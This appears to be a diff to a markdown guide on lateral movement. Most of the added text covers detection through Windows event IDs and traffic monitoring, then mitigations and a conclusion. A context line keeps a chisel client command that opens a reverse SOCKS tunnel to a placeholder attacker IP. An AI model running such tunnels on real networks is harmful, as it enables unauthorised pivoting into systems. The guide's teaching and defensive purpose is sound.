@@ -115,3 +115,31 @@ Client:
 ```
 chisel client <attacker-ip>:8000 R:1080:socks
 ```
+
+## 4. Detecting Lateral Movement
+
+Detection strategies include:
+
+- Monitoring Authentication Logs — Look for unusual logins, logon types, or accounts accessing multiple systems in short time spans.
+
+- Windows Event IDs —    
+    - 4624 (Successful logon) — check for anomalies
+    - 4625 (Failed logon attempts) — brute-force indicators        
+    - 4769 (Kerberos service ticket request) — possible PtT
+- Network Traffic Analysis — Identify unusual SMB, RDP, or WinRM activity.
+- Honeypots — Deploy decoy credentials or hosts to detect unauthorized movement.
+
+---
+## 5. Mitigations & Best Practices
+
+- Enforce Multi-Factor Authentication (MFA) for privileged accounts.
+- Limit Lateral Movement Paths — Segment networks and apply least privilege.
+- Disable Legacy Protocols like SMBv1 and NTLM where possible.
+- Patch Regularly to prevent exploitation of known vulnerabilities.
+- Use Credential Guard / LSASS Protection to prevent credential dumping.
+- Implement Monitoring & Alerting — SIEM rules for unusual account usage.
+
+---
+## 6. Conclusion
+
+Lateral movement is a key phase in post-exploitation that allows attackers to expand access and target critical assets. Understanding the techniques, being able to detect them, and applying strong mitigations is essential for reducing risk. Combining **proactive defense** with **continuous monitoring** will significantly improve resilience against these threats.
